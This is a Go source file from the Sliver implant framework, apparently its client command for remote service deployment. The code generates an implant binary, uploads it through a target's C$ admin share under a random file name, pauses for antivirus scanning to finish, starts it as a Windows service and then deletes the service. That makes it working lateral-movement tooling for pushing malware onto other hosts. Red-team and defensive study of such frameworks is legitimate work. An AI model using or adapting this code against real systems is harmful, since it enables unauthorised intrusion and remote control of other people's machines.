package commands

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"time"

	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
)

// Service - Start a sliver service on a remote target
type Service struct {
	Positional struct {
		Target string `description:"target FQDN" required:"1-1"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		ServiceName string `long:"service-name" short:"s" description:"name to be used to register the service" default:"Sliver"`
		Description string `long:"service-description" short:"d" description:"description of the service" default:"Sliver implant"`
		Profile     string `long:"profile" short:"p" description:"implant profile to use for service binary" required:"yes"`
		RemotePath  string `long:"binpath" short:"b" description:"directory to which the executable will be uploaded" default:"c:\\windows\\temp"`
		Timeout     int    `long:"timeout" short:"t" description:"command timeout in seconds" default:"60"`
	} `group:"service options"`
}

// Execute - Start a sliver service on a remote target
func (s *Service) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	hostname := s.Positional.Target

	profile := s.Options.Profile
	serviceName := s.Options.ServiceName
	serviceDesc := s.Options.Description
	binPath := s.Options.RemotePath
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))

	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
		fmt.Printf(util.Error+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
		fmt.Println(util.Error + "You might want to change that before going further...")
		if !isUserAnAdult() {
			return
		}
	}

	// generate sliver
	generateCtrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
	profiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	generateCtrl <- true
	<-generateCtrl
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == profile {
			p = prof
		}
	}
	if p.GetName() == "" {
		fmt.Printf(util.Error+"no profile found for name %s\n", profile)
		return
	}
	sliverBinary, err := getSliverBinary(*p, transport.RPC)
	filename := randomString(10)
	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
	// upload to remote target
	uploadCtrl := make(chan bool)
	go spin.Until("Uploading service binary ...", uploadCtrl)
	upload, err := transport.RPC.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
		Request: ContextRequest(session),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %s\n", err)
		return
	}
	fmt.Printf(util.Info+"Uploaded service binary to %s\n", upload.GetPath())
	fmt.Println(util.Info + "Waiting a bit for the file to be analyzed ...")
	// Looks like starting the service right away often fails
	// because a process is already using the binary.
	// I suspect that Defender on my lab is holding access
	// while scanning, which often resulted in an error.
	// Waiting 5 seconds seem to do the trick here.
	time.Sleep(5 * time.Second)
	// start service
	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
	serviceCtrl := make(chan bool)
	go spin.Until("Starting service ...", serviceCtrl)
	start, err := transport.RPC.StartService(context.Background(), &sliverpb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		ServiceDescription: serviceDesc,
		ServiceName:        serviceName,
		Arguments:          "",
		Request:            ContextRequest(session),
	})
	serviceCtrl <- true
	<-serviceCtrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	if start.Response != nil && start.Response.Err != "" {
		fmt.Printf(util.Error+"Error: %s\n", start.Response.Err)
		return
	}
	fmt.Printf(util.Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
	removeChan := make(chan bool)
	go spin.Until("Removing service ...", removeChan)
	removed, err := transport.RPC.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: ContextRequest(session),
	})
	removeChan <- true
	<-removeChan
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	if removed.Response != nil && removed.Response.Err != "" {
		fmt.Printf(util.Error+"Error: %s\n", removed.Response.Err)
		return
	}
	fmt.Printf(util.Info+"Successfully removed service %s on %s\n", serviceName, hostname)
	return nil
}

func randomString(length int) string {
	var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient) ([]byte, error) {
	var data []byte
	// get implant builds
	builds, err := rpc.ImplantBuilds(context.Background(), &commonpb.Empty{})
	if err != nil {
		return data, err
	}

	implantName := buildImplantName(profile.GetConfig().GetName())
	_, ok := builds.GetConfigs()[implantName]
	if implantName == "" || !ok {
		// no built implant found for profile, generate a new one
		fmt.Printf(util.Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
		ctrl := make(chan bool)
		go spin.Until("Compiling, please wait ...", ctrl)
		generated, err := rpc.Generate(context.Background(), &clientpb.GenerateReq{
			Config: profile.GetConfig(),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			fmt.Println("Error generating implant")
			return data, err
		}
		data = generated.GetFile().GetData()
		profile.Config.Name = buildImplantName(generated.GetFile().GetName())
		_, err = rpc.SaveImplantProfile(context.Background(), &profile)
		if err != nil {
			fmt.Println("Error updating implant profile")
			return data, err
		}
	} else {
		// Found a build, reuse that one
		fmt.Printf(util.Info+"Sliver name for profile: %s\n", implantName)
		regenerate, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
			ImplantName: profile.GetConfig().GetName(),
		})

		if err != nil {
			return data, err
		}
		data = regenerate.GetFile().GetData()
	}
	return data, err
}
